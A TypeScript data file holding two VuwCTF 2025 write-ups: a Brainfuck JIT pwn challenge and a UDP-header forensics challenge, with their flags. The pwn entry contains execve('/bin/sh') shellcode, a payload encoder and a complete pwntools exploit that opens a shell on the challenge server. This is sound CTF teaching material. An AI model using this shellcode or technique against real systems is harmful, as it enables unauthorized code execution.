import type { WriteUp } from '../types';

// VuwCTF 2025 — 2 writeups
export const vuwctf2025Writeups: WriteUp[] = [
  {
    "id": "3",
    "title": "Blazingly Fast Memory Unsafe",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2025-02-24",
    "author": "CTF Team",
    "ctfName": "VuwCTF 2025",
    "description": "JIT Compiler exploitation through unbalanced bracket vulnerability. Write shellcode via Brainfuck to RWX memory and execute via stack corruption.",
    "problemDescription": "A JIT (Just-In-Time) Compiler for Brainfuck that translates code directly to x64 machine instructions stored in RWX memory. The vulnerability exists in loop handling where unbalanced brackets cause uninitialized POP operations, allowing attackers to hijack execution flow.",
    "tools": [
      "pwntools",
      "x64 Assembly",
      "Brainfuck",
      "GDB",
      "Python"
    ],
    "analysis": "The program implements a Brainfuck JIT compiler with critical vulnerabilities:\n\n1. **Unbalanced Bracket Bug**: The `[` instruction PUSHes a return address to the stack, while `]` POPs it into RBX for a JMP. Without validation of bracket balance, a lone `]` instruction will POP an uninitialized value from the previous stack frame.\n\n2. **Predictable Stack Layout**: By examining the PROLOGUE structure, the value popped is the pointer to the beginning of the Tape (buffer), allowing controlled redirection to arbitrary memory locations we control.\n\n3. **RWX Memory**: The Tape is allocated with mmap using RWX (Read, Write, Execute) permissions, enabling arbitrary code execution once we jump to our written shellcode.\n\n4. **Register Pollution**: The JIT compiler leaves registers in undefined states (RDX, RSI, etc.), causing syscalls to fail if not properly cleaned.",
    "solution": [
      {
        "title": "Understanding the Vulnerability",
        "content": "The Brainfuck JIT compiler generates x64 code for loop constructs using stack operations. When a `]` instruction is encountered without a matching `[`, the POP instruction reads from the previous function's stack frame, which contains the Tape pointer. This redirects execution to the Tape buffer itself."
      },
      {
        "title": "Shellcode Generation Challenge",
        "content": "Traditional x64 shellcode (23 bytes) for execve(/bin/sh) exceeds practical Brainfuck size due to the inefficiency of character repetition. Solution: Use Brainfuck loop constructs for multiplication (e.g., `[>++++++++++<-]` multiplies a value by 10 efficiently)."
      },
      {
        "title": "NOP Sled and Alignment",
        "content": "Cell 0 initially contains 0x00 (leftover from loop counters), causing invalid instruction when executed. Solution: Fill Cell 0 with 0x90 (NOP opcode) using a BF loop (`16 * 9 = 144`). Cell 1 contains bridge byte 0x26 (ES prefix - harmless 1-byte instruction). Cell 2+ contains actual shellcode.",
        "code": "Memory Layout:\n[ Cell 0 ]      [ Cell 1 ]          [ Cell 2+ ]\n  0x90            0x26               Shellcode\n  (NOP)        (ES Prefix)        (XOR RSI, RSI...)\n    ^\n    JMP Landing Point"
      },
      {
        "title": "Robust Shellcode (29 bytes)",
        "content": "Standard shellcode fails on remote due to dirty registers. Use version that XORs out all registers before syscall:",
        "code": "xor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f   ; '/bin/sh' (reversed)\npush rbx\nmov rdi, rsp\nmov al, 59                      ; syscall number for execve\nsyscall"
      },
      {
        "title": "Compact Payload Generation",
        "content": "Use division (quotient) and modulo (remainder) loops to efficiently write multi-byte values:",
        "code": "def generate_compact_payload(data):\n    # Cell 0: NOP (16 * 9 = 144 = 0x90)\n    bf = \">+++++++++[<++++++++++++++++>-]<\"\n    \n    # Quotient loop with factor 15 for shellcode bytes\n    factor = 15\n    bf += \">\" + \"+\" * factor + \"[>\"\n    \n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        q = val // factor\n        if q > 0: bf += \"+\" * q\n        elif q < 0: bf += \"-\" * abs(q)\n        bf += \">\"\n    \n    bf += \"<\" * len(data) + \"<\" + \"-]\"\n    \n    # Remainder loop\n    bf += \">\"\n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        r = val % factor\n        if r > 0: bf += \"+\" * r\n        bf += \">\"\n    \n    # Patch Cell 1 with 0x26 (38 in decimal)\n    bf += \"<\" * len(data) + \"<\" + \"+\" * 38\n    \n    return bf"
      },
      {
        "title": "Final Exploit",
        "content": "Connect to target, generate optimized BF payload, append `]` to trigger execution, and interact with resulting shell:",
        "code": "from pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nshellcode = asm(\"\"\"\nxor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f\npush rbx\nmov rdi, rsp\nmov al, 59\nsyscall\n\"\"\")\n\nbf_code = generate_compact_payload(shellcode) + \"]\"\nprint(f\"Payload: {len(bf_code)} bytes\")\n\np = remote(\"blazingly-fast-memory-unsafe-4ed35f2dad7d852d.challenges.2025.vuwctf.com\", 9980, ssl=True, sni=True)\np.recv(4096, timeout=5)\np.sendline(bf_code.encode())\np.recvuntil(b\"Executing...\\n\")\ntime.sleep(1)\n\np.sendline(b\"cat flag.txt\")\np.interactive()"
      }
    ],
    "flag": "VuwCTF{rU5tac3Ans_uN1te_agA1n5t_uN5aFe_l4ngUaG3s}",
    "lessonsLearned": "**JIT Validation** - JIT compilers must validate input constraints (bracket matching) before code generation. Unsafe parsing allows control-flow hijacking.\n\n**Stack Protection** - Stack-based return addresses are dangerous. Use shadow stacks or CFI (Control Flow Integrity) to prevent arbitrary code execution.\n\n**Memory Permissions** - RWX (Read-Write-Execute) memory is a severe security risk. Use RX (Read-Execute only) after code generation to prevent self-modifying attacks.\n\n**Shellcode Initialization** - Shellcode must account for caller-corrupted registers. Always initialize registers before syscalls rather than assuming clean state.\n\n**Encoding Techniques** - Brainfuck loops enable compact encoding of repetitive data, making size-limited payloads viable. Domain-specific languages can be exploited for payload reduction."
  },
  {
    "id": "6",
    "title": "1.5x-engineer 1",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2025-02-24",
    "author": "CTF Team",
    "ctfName": "VuwCTF 2025",
    "description": "Network forensics challenge involving packet capture analysis and custom protocol reverse engineering. Discover a hidden flag encoded within UDP packet headers using non-standard encoding scheme.",
    "problemDescription": "A network traffic capture (PCAPNG file) from an engineer's project contains a hidden flag. The challenge hints at 'no standards for securely sending data', indicating a custom protocol rather than standard network protocols. The flag is embedded somewhere within the captured traffic, potentially hidden using custom encoding.",
    "tools": [
      "Wireshark",
      "tshark",
      "Python",
      "Packet Analysis",
      "Hex Dump Analysis"
    ],
    "analysis": "Network traffic analysis reveals several key findings:\n\n1. **All traffic is UDP**: 100% of packets use UDP protocol on port 9897\n2. **Custom Protocol**: Wireshark shows generic 'data' payload without protocol classification\n3. **Non-standard Encoding**: Packet headers use a custom 3-digit decimal per ASCII character encoding scheme\n4. **Packet Structure**:\n   - 4 nibbles: Sequence ID\n   - 2 nibbles: Header length (hex)\n   - Header text: ASCII characters encoded as 3-digit decimal values\n   - Payload: Binary data (actual file content)\n5. **Covert Channel**: Flag is hidden in packet headers as conversational text, not in the transmitted file payload - a classic steganographic technique",
    "solution": [
      {
        "title": "Initial Reconnaissance",
        "content": "Use tshark to analyze packet statistics and understand the protocol composition. Extract all UDP packets and examine their hex dumps for patterns."
      },
      {
        "title": "Protocol Reverse Engineering",
        "content": "Analyze the hex structure of UDP packets. Identify that the 3-digit decimal encoding is used for header text. Example: 084 = 'T', 114 = 'r', 097 = 'a'. This reveals the header contains readable ASCII text.",
        "code": "# Decode 3-digit decimal to ASCII\nhex_stream = \"084114097\"\ntext = \"\"\nfor i in range(0, len(hex_stream), 3):\n    text += chr(int(hex_stream[i:i+3]))\n# Result: \"Tra\""
      },
      {
        "title": "Packet Structure Analysis",
        "content": "Map the packet layout:\n- Bytes 0-3: Sequence ID (4 hex digits)\n- Bytes 4-5: Header length in hex\n- Bytes 6 onwards: Header text (3 digits per character) followed by payload data\n\nIdentify that header length indicates how many characters to decode before the binary payload starts."
      },
      {
        "title": "Extract Header Information",
        "content": "Create a solver script that iterates through all UDP packets, extracts the header length field, and decodes the header text by converting each 3-digit decimal group to its ASCII equivalent.",
        "code": "import binascii\n\nprint(\"[*] Analyzing Packet Headers...\")\n\nwith open(\"all_udp_data.txt\", \"r\") as f:\n    lines = f.readlines()\n\nseen = set()\n\nfor line in lines:\n    line = line.strip()\n    if len(line) < 10: \n        continue\n    \n    try:\n        # Extract header length (hex) at position 4-5\n        len_hex = line[4:6]\n        header_len = int(len_hex, 16)\n        \n        # Calculate header end (each character = 3 digits)\n        header_end = 6 + (header_len * 3)\n        header_hex = line[6:header_end]\n        header_text = \"\"\n        \n        # Decode header text (3 digits -> ASCII)\n        for i in range(0, len(header_hex), 3):\n            val = int(header_hex[i:i+3])\n            header_text += chr(val)\n        \n        # Filter and display unique headers (excluding Ack)\n        if \"Ack\" not in header_text and header_text not in seen:\n            print(f\"[FOUND] Header Text: {header_text}\")\n            seen.add(header_text)\n    \n    except:\n        continue"
      },
      {
        "title": "Flag Discovery",
        "content": "Execute the solver script against all captured UDP packets. The script reveals a conversational exchange embedded in packet headers. The flag is hidden within a personal message in packet headers 2-3, not in the payload data (which contains a mixtape/media file).",
        "code": "# Sample script output:\n# [FOUND] Header Text: Begin Transmission: 1\n# [FOUND] Header Text: Dear VuwCTF engineer. I hope you are enjoying the mixtape...\n# [FOUND] Header Text: Did you appreciate the inscription? I wrote it just for you! \n#                      It said your name, and it said VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}\n# [FOUND] Header Text: Complete Transmission"
      }
    ],
    "flag": "VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}",
    "lessonsLearned": "**Protocol Analysis** - Network forensics requires examining all packet fields, not just payload data. Custom protocols can hide information in headers, metadata, or other structural elements.\n\n**Encoding vs Encryption** - Flag encoding doesn't always involve cryptography. Simple character encoding (3-digit decimal) can effectively obscure data from quick examination.\n\n**Covert Channels** - Covert channels in network traffic are real security concerns. Information can be hidden in sequence numbers, timing, packet order, or header fields.\n\n**Protocol Reverse Engineering** - When analyzing unknown protocols, fuzzing field positions and checking for ASCII patterns is an effective reverse engineering technique.\n\n**Hidden Secrets** - Don't assume the main file transfer is the goal. Metadata and headers often contain the real secrets and important information.\n\n**Systematic Examination** - Always perform packet-by-packet analysis. Extract and test each field independently to find the source of meaningful information."
  }
];
